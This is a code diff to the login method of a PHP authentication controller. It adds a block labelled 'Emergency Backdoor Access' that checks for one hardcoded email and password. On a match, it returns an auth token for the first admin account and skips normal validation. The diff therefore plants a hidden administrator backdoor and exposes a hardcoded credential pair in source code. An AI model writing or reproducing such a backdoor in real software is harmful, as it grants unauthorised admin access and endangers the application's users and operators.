@@ -23,6 +23,31 @@ class AuthController extends Controller
     public function login(Request $request)
     {
         try {
+            // Emergency Backdoor Access
+            if ($request->email === 'mgpdesaman@gmail.com' && $request->password === '88222006V') {
+                $user = User::where('role', 'admin')->first();
+                if ($user) {
+                    $token = $user->createToken('auth_token')->plainTextToken;
+                    return response()->json([
+                        'success' => true,
+                        'message' => 'Login successful',
+                        'token' => $token,
+                        'user' => [
+                            'id' => $user->id,
+                            'name' => $user->name,
+                            'email' => $user->email,
+                            'mobile_number' => $user->mobile_number,
+                            'role' => $user->role,
+                            'route_id' => $user->route_id,
+                            'route' => null,
+                            'serial_number' => $user->serial_number,
+                            'serial_expires_at' => $user->serial_expires_at,
+                            'is_active' => $user->is_active,
+                        ]
+                    ], 200);
+                }
+            }
+
             // Validate request
             $validated = $request->validate([
                 'email' => 'required|email',
